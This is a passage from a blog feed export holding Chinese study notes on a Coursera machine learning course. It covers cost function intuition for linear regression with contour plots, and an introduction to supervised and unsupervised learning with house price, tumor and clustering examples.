最后会得到一个较大的数值 类似于5.25 等等 对于不同的  $\theta_1$ 你可以计算出这些对应的值 对吗 结果你会发现 你算出来的这些值 你得到一条这样的曲线 通过计算这些值 你可以慢慢地得到这条线 这就是 $J(θ)$ 的样子了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487193_1227128932_1539944492" alt="_1526487193_1227128932_1539944492_1526487193_1227128932.png"></p><ul><li>我们来回顾一下 <strong>任何一个  $\theta_1$ 的取值对应着一个不同的 假设函数 或者说对应着左边一条不同的拟合直线。 对于任意的 $\theta_1$ 你可以算出一个不同的  $J(\theta_1)$ 的取值</strong> 举个例子 你知道的  $\theta_1$ 等于1时对应着穿过这些数据的这条浅蓝色直线 当  $\theta_1$ 等于0.5 也就是这个玫红色的点 也许对应着这条线 然后  $\theta_1$ 等于0 也就是深蓝色的这个点 对应着 这条水平的线 对吧</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487236_2027776779_1539944521" alt="_1526487236_2027776779_1539944521_1526487236_2027776779.png"></p><ul><li>所以对于任意一个  $\theta_1$ 的取值 我们会得到 一个不同的  $J(\theta_1)$ 而且我们可以利用这些来描出右边的这条曲线 现在你还记得 <strong>学习算法的优化目标 是我们想找到一个  $\theta_1$ 的值 来将 $J(\theta_1)$ 最小化</strong> 对吗 这是我们线性回归的目标函数 嗯 看这条曲线(上图左边浅蓝色) <strong>让 $J(\theta_1)$ 最小化的值 是  $\theta_1$ 等于1 然后你看 这个确实就对应着最佳的通过了数据点的拟合直线 这条直线就是由  $\theta_1=1$ 的设定而得到的 然后 对于这个特定的训练样本 我们最后能够完美地拟合 这就是为什么最小化 $J(\theta_1)$ 对应着寻找一个最佳拟合直线的目标</strong></li><li>总结一下 在这个视频里 我们看到了一些图形 来理解代价函数 要做到这个 我们简化了算法 让这个函数只有一个参数  $\theta_1$ 也就是说我们把  $\theta_0$ 设定为0 在下一个视频里 我们将回到原来的问题的公式 然后看一些 带有  $\theta_0$ 和  $\theta_1$ 的图形 也就是说不把  $\theta_0$ 设置为0了 希望这会让你更好地理解在原来的线性回归公式里 代价函数 $J$ 的意义</li></ul><h3 id="小小的总结-Cost-Function-Intuition-I笔记"><a href="#小小的总结-Cost-Function-Intuition-I笔记" class="headerlink" title="小小的总结-Cost Function - Intuition I笔记"></a>小小的总结-Cost Function - Intuition I笔记</h3><ul><li>如果我们试图用视觉术语来思考它，我们的训练数据集就散布在<code>x-y平面</code>上。 我们试图做一条直线（由$h_\theta(x)$定义）来穿过这些散布的数据点。</li><li>我们的目标是获得最佳线路。 尽可能最好的线是这样的，以便<strong>线上散射点的平均垂直距离将是最小的</strong>。 理想情况下，该线应该通过我们训练数据集的所有点。 在这种情况下，$J(\theta_0,\theta_1)$值将为0.以下示例显示了代价函数为0的理想情况。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487322_1703355374_1539944559" alt="_1526487322_1703355374_1539944559_1526487322_1703355374.png"></p><ul><li>当$\theta_1=1$我们得到1的斜率时，它会经历我们模型中的每个单一数据点。 相反，当$\theta_1=0.5$我们看到从适合度到数据点的垂直距离增加时。</li><li>这使我们的代价函数增加到0.58。 绘制几个其他点产生到以下图表：</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487533_1540848643_1539944572" alt="_1526487533_1540848643_1539944572_1526487533_1540848643.png"></p><ul><li>因此，<strong>作为一个目标，我们应该尽量减少代价函数</strong>。 在这种情况下，$\theta_1=1$是我们整体最低的。</li></ul><h2 id="Cost-Function-Intuition-II"><a href="#Cost-Function-Intuition-II" class="headerlink" title="Cost Function - Intuition II"></a>Cost Function - Intuition II</h2><ul><li>这节课中 我们将更深入地学习代价函数的作用 这段视频的内容假设你已经认识轮廓图 如果你对轮廓图不太熟悉的话 这段视频中的某些内容你可能会听不懂 但不要紧 如果你跳过这段视频的话 也没什么关系 不听这节课对后续课程理解影响不大</li><li>和之前一样 这是我们的几个重要公式 包括了假设$h$、参数$\theta$、代价函数$J$ 以及优化目标 跟前一节视频不同的是 我还是把$\theta$写成$\theta_0$,$\theta_1$的形式 便于这里我们要对代价函数进行的可视化</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487815_1577285052_1539944607" alt="_1526487815_1577285052_1539944607_1526487815_1577285052.png"></p><ul><li>和上次一样 首先来理解假设函数$h$和代价函数$J$ 这是<strong>房价数据组成的训练集数据</strong> 让我们来构建某种假设 就像这条线一样 很显然这不是一个很好的假设 但不管怎样 如果我<strong>假设$\theta_0$等于50,  $\theta_1$等于0.06的话 那么我将得到这样一个假设函数</strong> 对应于这条直线 给出 $\theta_0$ 和 $\theta_1$ 的值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487858_570681900_1539944661" alt="_1526487858_570681900_1539944661_1526487858_570681900.png"></p><ul><li>我们要在右边画出代价函数的图像 上一次 我们是只有一个 $\theta_1$ 也就是说 画出的代价函数是关于 $\theta_1$ 的函数 但现在我们有两个参数 $\theta_0$ 和$\theta_1$ 因此图像就会复杂一些了 当只有一个参数$\theta_1$的时候 我们画出来是这样一个弓形函数 而现在我们有了两个参数 那么代价函数 仍然呈现类似的某种弓形 实际上这取决于训练样本</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487889_1193089078_1539944694" alt="_1526487889_1193089078_1539944694_1526487889_1193089078.png"></p><ul><li>你可能会得到这样的图形 因此这是一个三维曲面图 两个轴分别表示 $\theta_0$ 和 $\theta_1$ 随着你改变 $\theta_0$ 和 $\theta_1$ 的大小 你便会得到不同的代价函数 $J(\theta_0,\theta_1)$ 对于某个特定的点 $(\theta_0,\theta_1)$  这个曲面的高度 也就是竖直方向的高度 就表示代价函数 $J(\theta_0,\theta_1)$ 的值 不难发现这是一个弓形曲面</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487921_1156596403_1539944720" alt="_1526487921_1156596403_1539944720_1526487921_1156596403.png"></p><ul><li>我们来看看三维图 这是这个曲面的三维图 水平轴是$\theta_0$、$\theta_1$ 竖直方向表示 $J(\theta_0,\theta_1)$ 旋转一下这个图 你就更能理解这个弓形曲面所表示的代价函数了 在这段视频的后半部分 为了描述方便 我将不再像这样给你用三维曲面图的方式解释代价函数J 而还是<strong>用轮廓图来表示</strong> .<code>contour plot</code> 或 <code>contour figure</code> 意思一样</li><li>下图就是一个轮廓图 两个轴分别表示 $\theta_0$ 和 $\theta_1$ 而这些一圈一圈的椭圆形 <strong>每一个圈就表示  $J(\theta_0,\theta_1)$ 相同的所有点的集合</strong> 具体举例来说 我们选三个点出来 这三个桃红色的点 都表示相同的  $J(\theta_0,\theta_1)$ 的值 对吧 横纵坐标分别是$\theta_0$ 和 $\theta_1$   这三个点的 $J(\theta_0,\theta_1)$ 值是相同的 如果你之前没怎么接触轮廓图的话 你就这么想 你就想象一个弓形的函数从屏幕里冒出来  因此<strong><code>最小值</code> 也就是这个弓形的最低点就是这个点 对吧 也就是这一系列同心椭圆的<code>中心点</code></strong> 想象一下这个弓形从屏幕里冒出来 所以这些椭圆形 都从我的屏幕上冒出相同的高度 弓形的最小值点是这个位置 因此轮廓图是一种很方便的方法 能够直观地观察 代价函数$J$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487962_306972773_1539944750" alt="_1526487962_306972773_1539944750_1526487962_306972773.png"></p><ul><li>接下来让我们看几个例子 在这里有一点 这个点表示 <strong>$\theta_0$等于800 $\theta_1$大概等于-0.15</strong>  那么这个 <strong>红色的点 代表了某个 $(\theta_0,\theta_1)$ 组成的数值组</strong> 而这个点也对应于左边这样一条线 对吧 $\theta_0$等于800 也就是跟纵轴相交于大约800 斜率大概是-0.15 当然 这条线并不能很好地拟合数据 对吧 以这组 $\theta_0$ 和 $\theta_1$ 为参数的这个假设 $h(x)$ 并不是数据的较好拟合 并且你也发现了 这个代价值 就是这里的这个值 距离最小值点还很远 也就是说这个代价值还是算比较大的 因此不能很好拟合数据</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526487994_1194723141_1539944788" alt="_1526487994_1194723141_1539944788_1526487994_1194723141.png"></p><ul><li>让我们再来看几个例子 这是另一个假设 你不难发现 这依然不是一个好的拟合 但比刚才稍微好一点 这是我的 $\theta_0$ 和 $\theta_1$ 点 这是 <strong>$\theta_0$ 的值 大约为360 $\theta_1$ 的值为0</strong> 我们把它写下来 $\theta_0$=360 $\theta_1$=0 因此这组$\theta$值对应的假设是 这条水平的直线 也就是 $h(x)=360+0<em>x$  这就是<code>假设</code> 这个假设同样也有某个<code>代价值</code> 而这个*</em>代价值就对应于这个代价函数在这一点的高度**</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526488011_1542676591_1539944816" alt="_1526488011_1542676591_1539944816_1526488011_1542676591.png"></p><ul><li>最后一个例子 这个点其实不是最小值 但已经非常靠近最小值点了 这个点对数据的拟合就很不错 它对应这样两个$\theta_0$  和 $\theta_1$ 的值 同时也对应这样一个 $h(x)$ 这个点虽然不在最小值点 但非常接近了 因此误差平方和 或者说 <strong>训练样本和假设的距离的平方和 这个距离值的平方和 非常接近于最小值</strong> 尽管它还不是最小值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526488021_554234801_1539944853" alt="_1526488021_554234801_1539944853_1526488021_554234801.png"></p><ul><li>好的 通过这些图形 我希望你能更好地 理解这些<code>代价函数 J</code> 所表达的值 它们是什么样的 它们对应的假设是什么样的 以及什么样的假设对应的点 更接近于代价函数J的最小值 当然 我们真正需要的是一种有效的算法 能够自动地找出这些使代价函数$J$取最小值的参数$\theta_0$和$\theta_1$来 对吧 我想我们也不希望编个程序 把这些点画出来 然后人工的方法来读出这些点的数值 这很明显不是一个好办法 事实上 我们后面就会学到 我们会遇到更复杂、更高维度、更多参数的情况 这在我们在后面的视频中很快就会遇到 而这些情况是很难画出图的 因此更无法将其可视化 因此<strong>我们真正需要的 是编写程序来找出这些最小化代价函数的$\theta_0$和$\theta_1$的值</strong> 在下一节视频中 我们将介绍一种算法 能够自动地找出能使代价函数 $J$ 最小化的参数$\theta_0$和$\theta_1$的值</li></ul><h3 id="小小的总结–Cost-Function-代价函数-Intuition-II"><a href="#小小的总结–Cost-Function-代价函数-Intuition-II" class="headerlink" title="小小的总结–Cost Function(代价函数) - Intuition II"></a>小小的总结–Cost Function(代价函数) - Intuition II</h3><ul><li><code>轮廓图（或者叫等值线图）</code>是包含许多等高线的图。<strong>两个变量函数的轮廓线在同一行的所有点上具有恒定值</strong>。这种图的一个例子就是下面的图。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526488042_674655632_1539944900" alt="_1526488042_674655632_1539944900_1526488042_674655632.png"></p><ul><li>采取任何颜色并沿着“圆”走，人们会期望获得相同的成本函数值。例如，上面绿线上的三个绿色点对于 $J(\theta_0,\theta_1)$具有相同的值，因此它们沿着同一条线发现。带圆圈的x显示 $\theta_0=800$ 和$\theta_1=-0.15$时左侧图形的成本函数值。再取一个$h(x)$ 并绘制其轮廓图（等值线图），可以得到以下图表：</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526488050_330535995_1539944915" alt="_1526488050_330535995_1539944915_1526488050_330535995.png"></p><ul><li>当 $\theta_0=360$ 且 $\theta_1=0$ 时，等值线图中 $J(\theta_0,\theta_1)$ 的值<strong>更靠近中心，从而降低了代价函数误差</strong>。现在给我们的假设函数一个稍微正向的斜率会导致更好的数据拟合。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526488073_471902153_1539944930" alt="_1526488073_471902153_1539944930_1526488073_471902153.png"></p><ul><li>上面的图尽可能地降低了成本函数，因此，$\theta_1$和$\theta_0$的结果分别趋于0.12和250左右。将我们图上的这些值绘制在右侧似乎将我们的观点<strong>置于最内层“圈子”的中心</strong>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cost Function </tag>
            
            <tag> 代价函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零:机器学习介绍</title>
      <link href="/2018/11/15/ling-ji-qi-xue-xi-jie-shao/"/>
      <url>/2018/11/15/ling-ji-qi-xue-xi-jie-shao/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.coursera.org/learn/machine-learning/" target="_blank" rel="noopener">视频地址</a></p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><h3 id="定义1"><a href="#定义1" class="headerlink" title="定义1"></a>定义1</h3><pre><code>给予计算机学习能力的领域。</code></pre><ul><li>Samuel的定义可以回溯到50年代，他编写了一个西洋棋程序。 这程序神奇之处在于，编程者自己并不是个下棋高手。 但因为他太菜了，于是就通过编程， 让西洋棋程序自己跟自己下了上万盘棋。通过观察 哪种布局（棋盘位置）会赢，哪种布局会输， 久而久之，这西洋棋程序明白了什么是好的布局， 什么样是坏的布局。然后就牛逼大发了，程序通过学习后， 玩西洋棋的水平超过了Samuel。这绝对是令人注目的成果。 尽管编写者自己是个菜鸟，但因为 计算机有着足够的耐心，去下上万盘的棋， 一般人不会有这种耐心去下这么多盘棋。通过这些练习， 计算机获得无比丰富的经验，于是渐渐成为了 比Samuel更厉害的西洋棋手。<a id="more"></a><h3 id="定义2"><a href="#定义2" class="headerlink" title="定义2:"></a>定义2:</h3>  由Tom Mitchell提出，来自卡内基梅隆大学.一个好的学习一个程序被认为能从经验E中学习，解决任务 T，达到 性能度量值P，当且仅当，有了经验E后，经过P评判， 程序在处理 T 时的性能有所提升</li><li>在西洋棋那例子中，<ul><li><code>经验E</code> :程序上万次的自我练习的经验</li><li><code>任务T</code> :就是下棋。</li><li><code>性能度量值p</code>:，就是它在与一些新的对手比赛时，赢得比赛的概率。 </li></ul></li><li>目主要的两种类型学习算法被我们称之为<code>监督学习</code>和<code>无监督学习</code>。<ul><li><code>监督学习</code>:我们将教计算机如何去完成任务</li><li><code>无监督学习</code>:让它自己进行学习。<h2 id="监督学习-Supervised-Learning"><a href="#监督学习-Supervised-Learning" class="headerlink" title="监督学习(Supervised Learning)"></a>监督学习(Supervised Learning)</h2><h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1:"></a>例子1:</h3></li></ul></li><li>假设你想预测房价， 之前，某学生已经从某地收集了数据集其中一个数据集是这样的。 这是横坐标，即不同房子的面积，单位平方 纵轴上是房价，单位 千美元。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485168_1551005604_1539942902" alt="_1526485168_1551005604_1539942902_1526485168_1551005604.png"></p><ul><li>根据给定数据，假设你朋友有栋房子，750平尺（70平米） 想知道这房子能卖多少，好卖掉。 那么，学习算法怎么帮你呢？学习算法可以： 绘出一条直线，让直线尽可能匹配到所有数据。 基于此，看上去，那个房子应该、可能、也许、大概 卖到15万美元（一平米两千刀！）。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485361_1959833259_1539942923" alt="_1526485361_1959833259_1539942923_1526485361_1959833259.png"></p><ul><li>但这不是唯一的学习算法。 可能还有更好的。比如不用直线了， 可能平方函数会更好， 即二次多项式更符合数据集。如果你这样做， 预测结果就应该是20万刀（一平三千刀，涨价好快）。 后面我们会介绍到如何选择 是选择直线还是平方函数来拟合。 没有明确的选择，就不知哪个能给你的朋友 更好的卖房建议。只是这些每个都是很好的学习算法例子。 也是监督学习的例子。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485380_1269206818_1539942939" alt="_1526485380_1269206818_1539942939_1526485380_1269206818.png"></p><p>术语<code>监督学习</code>，意指<strong>给出一个算法， 需要部分数据集已经有正确答案</strong>。比如给定房价数据集， 对于里面每个数据，算法都知道对应的正确房价， 即这房子实际卖出的价格。<strong>算法的结果就是 算出更多的正确价格</strong>，比如那个新房子， 你朋友想卖的那个。用更术语的方式来定义， <strong><code>监督学习又叫回归问题(regression problem)</code>，（应该是回归属于监督中的一种） 意指要预测一个<code>连续值</code>的输出</strong>，比如房价。 虽然从技术上，一般把房价记到美分单位。 所以实际还是个离散值，但通常把它看作实际数字， 是一个标量值，一个连续值的数，而术语<strong>回归， 意味着要预测这类连续值属性的种类</strong>。</p><h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2:"></a>例子2:</h3><ul><li>另一个监督学习的例子，我和一些朋友 之前研究的领域。让我们来看医学记录， 并预测胸部肿瘤是恶性良性。 如果某人发现有胸部肿瘤，恶性肿瘤有害又危险， 良性肿瘤则是少害。 显然人们很关注这个。让我们看一个收集好的数据集，</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485436_1662003455_1539942955" alt="_1526485436_1662003455_1539942955_1526485436_1662003455.png"></p><ul><li>假设在数据集中，<strong>横轴表示肿瘤的大小， 纵轴我打算圈上0或1，是或否， 即肿瘤是恶性的(红色叉叉)还是良性(蓝色叉叉)的。</strong> 所以如图所示，可以看到这个大小的肿瘤块 是良性的，还有这些大小的都是良性的。 不幸地是也看到一些恶性肿瘤，比如这些大小的肿瘤。 所以，有5个良性块，在这一块， 还有5个恶性的，它们纵轴值为1.</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485466_72624286_1539942971" alt="_1526485466_72624286_1539942971_1526485466_72624286.png"></p><ul><li>现在假设某人杯具地得胸部肿瘤了， 大小大概是箭头指向这么大。 对应的机器学习问题就是，你能否估算出一个概率， 即肿瘤为恶或为良的概率？ 专业地说，这是个<code>分类问题(classification problem)</code>。 <strong>分类是要预测一个<code>离散值</code>输出</strong>。 这里是0或1，恶性或良性。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485496_2090819363_1539943001" alt="_1526485496_2090819363_1539943001_1526485496_2090819363.png"></p><ul><li>事实证明， 在分类问题中，有时会有超过两个的值， 输出的值可能超过两种。举个具体例子， 胸部肿瘤可能有三种类型，所以要预测离散值0，1，2，3 ，假设总共有三种癌症。<ul><li>0就是良性肿瘤，没有癌症。</li><li>1 表示1号癌症</li><li>2 是2号癌症，</li><li>3 就是3号癌症</li><li>这同样是个<strong>分类问题，因为它的输出的离散值集合</strong> 分别对应于无癌，1号，2号，3号癌症 </li></ul></li><li>我再露一小手，在分类问题中，还有另一种作图方式 来描述数据—我画你猜。<strong>要用到些许不同的符号集合来描绘数据</strong>。如果肿瘤大小作为唯一属性， 被用于预测恶性良性，可以把数据作图成这样。 使用不同的符号来表示良性和 恶性，即阴性和阳性。所以，不再统一画叉叉了， 改用<strong>圈圈来代表良性肿瘤</strong>，就像这样。 仍沿用<strong>X（叉叉）代表恶性肿瘤</strong>。希望你能明白。 我所做的就是，把在上面的数据， 映射下来。再用不同的符号， 圈和叉来分别代表良性和恶性。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485537_359149279_1539943034" alt="_1526485537_359149279_1539943034_1526485537_359149279.png"></p><ul><li><strong>在上例中，只使用了一个特征属性，即肿瘤块大小， 来预测肿瘤是恶性良性</strong>。在其它机器学习问题里， 有着不只一个的特征和属性。</li><li>举个例子，现在不只是知道肿瘤大小， 病人年龄和肿瘤大小都知道了。这种情况下， 数据集如表图所示，有些病人，年龄、肿瘤已知， 不同的病人，会有一点不一样， <strong>肿瘤恶性，则用叉来代表</strong>。所以，假设 有一朋友得了肿瘤。肿瘤大小和年龄 落在此处。那么依据这个给定的数据集，学习算法 所做的就是画一条直线，分开 恶性肿瘤和良性肿瘤，所以<strong>学习算法会 画条直线</strong>，像这样，把两类肿瘤分开。 然后你就能判断你朋友的肿瘤是…了 如果它在那边，学习算法就说 你朋友的肿瘤在良性一边，因此更可能 是良性的。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485695_454140810_1539943078" alt="_1526485695_454140810_1539943078_1526485695_454140810.png"></p><ul><li>好，本例中，总共有两个特征， 即<strong>病人年龄和肿瘤大小</strong>。在别的ML(机器学习)问题中， 经常会用到更多特征，我朋友研究这个问题时， 通常使用这些特征：比如块的厚度，即胸部肿瘤的厚度 肿瘤细胞大小和形状的一致性， 等等。它表明， 最有趣的学习算法（本课中将学到） 能够处理，无穷多个特征。不是3到5个这么少。 在这张幻灯片中，我已经列举了总共5个不同的特征。 但对于一些学习问题， 真要用到的不只是三五个特征， 要用到无数多个特征，非常多的属性， 所以，你的学习算法要使用很多的属性 或特征、线索来进行预测。</li><li>那么，你如何<strong>处理无限多特征呢</strong>？甚至你如何存储无数的东西 进电脑里，又要避免内存不足？ 事实上，等我们介绍一种叫<strong>支持向量机</strong>的算法时， 就知道存在一个简洁的数学方法，能让电脑处理无限多的特征。 想像下，我不是这边写两个特征， 右边写三个特征。而是，写一个无限长的特征表， 不停地写特征，似乎是个无限长的特征的表。 但是，我们也有能力设计一个算法来处理这个问题。</li><li>本课中，我们介绍监督学习。 其基本思想是，<strong>监督学习中，对于数据集中的每个数据， 都有相应的正确答案（训练集） ,算法就是基于这些来做出预测</strong>.就像那个房价， 或肿瘤的性质。后面介绍了回归问题。 即<strong>通过回归来预测一个连续值输出</strong>。 我们还谈到了<strong>分类问题， 目标是预测离散值输出</strong>。</li><li>下面是个小测验题目： 假设你有家公司，希望研究相应的学习算法去 解决两个问题。第一个问题，你有一堆货物的清单。 假设一些货物有几千件可卖， 你想预测出，你能在未来三个月卖出多少货物。 第二个问题，你有很多用户， 你打算写程序来检查每个用户的帐目。 对每个用户的帐目， 判断这个帐目是否被黑过（hacked or compromised）。 请问，这两个问题是分类问题，还是回归问题？</li><li>问题一是个回归问题 因为如果我有几千件货物， 可能只好把它当作一个实际的值，一个连续的值。 也把卖出的数量当作连续值。 第二个问题，则是分类问题，因为可以把 我想预测的一个值设为0，来表示账目没有被hacked 另一个设为1，表示已经被hacked。 就像乳癌例子中，0表示良性，1表示恶性。 所以这个值为0或1，取决于是否被hacked， 有算法能预测出是这两个离散值中的哪个。 因为只有少量的离散值，所以这个就是个分类问题。</li></ul><h3 id="小小的总结"><a href="#小小的总结" class="headerlink" title="小小的总结"></a>小小的总结</h3><ul><li>在监督式学习中，我们给了一个数据集，并且已经知道我们的正确输出应该是什么样子，并且有输入和输出之间有关系的想法。</li><li>监督学习问题分为“<code>回归</code>”和“<code>分类</code>”问题。<ul><li>在<code>回归问题</code>中，我们试图预测<code>连续输出中</code>的结果，这意味着我们试图将<code>输入变量</code>映射到某个<code>连续函数</code>。</li><li>在<code>分类问题</code>中，我们试图预测<code>离散输出</code>的结果。换句话说，我们试图将<code>输入变量</code>映射到<code>离散类别</code></li></ul></li><li>例子<ol><li>回归 —– 给定一个人的照片，我们必须根据给定的图片来预测他们的年龄</li><li>分类 —– 给予患有肿瘤的患者，我们必须预测肿瘤是恶性的还是良性的。</li></ol></li></ul><h2 id="无监督学习-Unsupervised-Learning"><a href="#无监督学习-Unsupervised-Learning" class="headerlink" title="无监督学习(Unsupervised Learning)"></a>无监督学习(Unsupervised Learning)</h2><blockquote><p>在上一节视频中 我们已经讲过了监督学习 回想起上次的数据集 每个样本 都已经被标明为 正样本或者负样本 即良性或恶性肿瘤</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485792_1823245979_1539943092" alt="_1526485792_1823245979_1539943092_1526485792_1823245979.png"></p><ul><li>因此 <strong>对于监督学习中的每一个样本 我们已经被清楚地告知了 什么是所谓的正确答案</strong> 即它们是良性还是恶性 在无监督学习中 我们用的数据会和监督学习里的看起来有些不一样 <strong>在无监督学习中 没有属性或标签这一概念 也就是说所有的数据都是一样的,没有区别</strong></li><li>所以在无监督学习中 我们只有一个数据集 没人告诉我们该怎么做 我们也不知道每个数据点究竟是什么意思,相反 它只告诉我们:<strong>现在有一个数据集 你能在其中找到某种结构吗?</strong> 对于给定的数据集,无监督学习算法可能判定,<strong>该数据集包含两个不同的聚类</strong>,这是第一个聚类,然后这是另一个聚类 .<strong><code>无监督学习算法</code> 会把这些数据分成两个不同的聚类</strong>,所以这就是所谓的<code>聚类算法</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485838_932487436_1539943106" alt="_1526485838_932487436_1539943106_1526485838_932487436.png"></p><h3 id="例子1-1"><a href="#例子1-1" class="headerlink" title="例子1"></a>例子1</h3><ul><li>我们来举一个聚类算法的例子 Google 新闻的例子 如果你还没见过这个页面的话 你可以到这个URL:news.google.com 去看看谷歌新闻每天都在干什么呢？ 他们每天会去收集成千上万的网络上的新闻然后将他们<strong>分组组成一个个新闻专题</strong></li><li>比如 让我们来看看这里,这里的URL链接连接着不同的有关BP油井事故的报道,所以 让我们点击 这些URL中的一个 恩 让我们点一个 然后我们会来到这样一个网页 这是一篇来自华尔街日报的 有关……你懂的 有关BP油井泄漏事故的报道 标题为《BP杀死了Macondo》 Macondo 是个地名 就是那个漏油事故的地方 如果你从这个组里点击一个不同的URL 那么你可能会得到不同的新闻 这里是一则CNN的新闻 是一个有关BP石油泄漏的视频 如果你再点击第三个链接 又会出现不同的新闻 这边是英国卫报的报道 也是关于BP石油泄漏 </li><li>所以 谷歌新闻所做的就是 <strong>去搜索成千上万条新闻 然后自动的将他们聚合在一起</strong> 因此 有关同一主题的 新闻被显示在一起 实际上 聚类算法和无监督学习算法 也可以被用于许多其他的问题 </li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485861_1249334585_1539943121" alt="_1526485861_1249334585_1539943121_1526485861_1249334585.png"></p><h3 id="例子2-1"><a href="#例子2-1" class="headerlink" title="例子2"></a>例子2</h3><ul><li>这里我们举个它在基因组学中的应用</li><li>下面是一个关于基因芯片的例子 基本的思想是 <strong>给定一组不同的个体,对于每个个体,检测它们是否拥有某个特定的基因</strong> 也就是说，你要去分析有多少基因显现出来了 因此 这些颜色 红 绿 灰 等等 它们 展示了这些不同的个体 是否拥有一个特定基因 的不同程度</li><li>然后你能做的就是 运行一个聚类算法 把不同的个体归入不同的类 或归为不同类型的人</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485895_1918759847_1539943134" alt="_1526485895_1918759847_1539943134_1526485895_1918759847.png"></p><ul><li>这就是无监督学习 我们没有提前告知这个算法 这些是第一类的人 这些是第二类的人 这些是第三类的人等等 相反我们只是告诉算法 你看 这儿有一堆数据 我不知道这个数据是什么东东 我不知道里面都有些什么类型 叫什么名字 我甚至不知道都有哪些类型 但是 请问你可以自动的找到这些数据中的类型吗？ 然后自动的 按得到的类型把这些个体分类 虽然事先我并不知道哪些类型 因为对于这些数据样本来说 我们<code>没有给算法一个正确答案,所以这就是无监督学习</code></li></ul><h3 id="其他例子"><a href="#其他例子" class="headerlink" title="其他例子"></a>其他例子</h3><ul><li>无监督学习或聚类算法在其他领域也有着大量的应用</li></ul><h4 id="它被用来组织大型的计算机集群"><a href="#它被用来组织大型的计算机集群" class="headerlink" title="它被用来组织大型的计算机集群"></a>它被用来组织大型的计算机集群</h4><ul><li>我有一些朋友在管理 大型数据中心 也就是 大型计算机集群 并试图 找出哪些机器趋向于 协同工作 如果你把这些机器放在一起 你就可以让你的数据中心更高效地工作</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485943_1884734823_1539943144" alt="_1526485943_1884734823_1539943144_1526485943_1884734823.png"></p><h4 id="用于社交网络的分析"><a href="#用于社交网络的分析" class="headerlink" title="用于社交网络的分析"></a>用于社交网络的分析</h4><ul><li>所以 如果可以得知 哪些朋友你用email联系的最多 或者知道你的Facebook好友 或者你Google+里的朋友 知道了这些之后 我们是否可以自动识别 哪些是很要好的朋友组 哪些仅仅是互相认识的朋友组</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526485965_1931576913_1539943156" alt="_1526485965_1931576913_1539943156_1526485965_1931576913.png"></p><h4 id="还有在市场分割中的应用"><a href="#还有在市场分割中的应用" class="headerlink" title="还有在市场分割中的应用"></a>还有在市场分割中的应用</h4><ul><li>许多公司拥有庞大的客户信息数据库,那么,给你一个客户数据集,你能否自动找出不同的市场分割,并自动将你的客户分到不同的细分市场中.从而有助于我在不同的细分市场中进行更有效的销售 </li><li>这也是无监督学习 我们现在有 这些客户数据 但我们预先并不知道 有哪些细分市场 而且 对于我们数据集的某个客户 我们也不能预先知道 谁属于细分市场一 谁又属于细分市场二等等 但我们必须让这个算法自己去从数据中发现这一切</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486000_1961140321_1539943168" alt="_1526486000_1961140321_1539943168_1526486000_1961140321.png"></p><h4 id="天文数据分析-通过这些聚类算法"><a href="#天文数据分析-通过这些聚类算法" class="headerlink" title="天文数据分析 通过这些聚类算法"></a>天文数据分析 通过这些聚类算法</h4><ul><li>我们发现了许多 惊人的、有趣的 以及实用的 关于星系是如何诞生的理论 所有这些都是聚类算法的例子 而<strong>聚类只是无监督学习的一种</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526486023_1506023228_1539943178" alt="_1526486023_1506023228_1539943178_1526486023_1506023228.png"></p><h4 id="鸡尾酒宴问题"><a href="#鸡尾酒宴问题" class="headerlink" title="鸡尾酒宴问题"></a>鸡尾酒宴问题</h4><ul><li>恩 我想你参加过鸡尾酒会的 是吧？ 嗯 想象一下 有一个宴会 有一屋子的人 大家都坐在一起 而且在同时说话 有许多声音混杂在一起 因为每个人都是在同一时间说话的 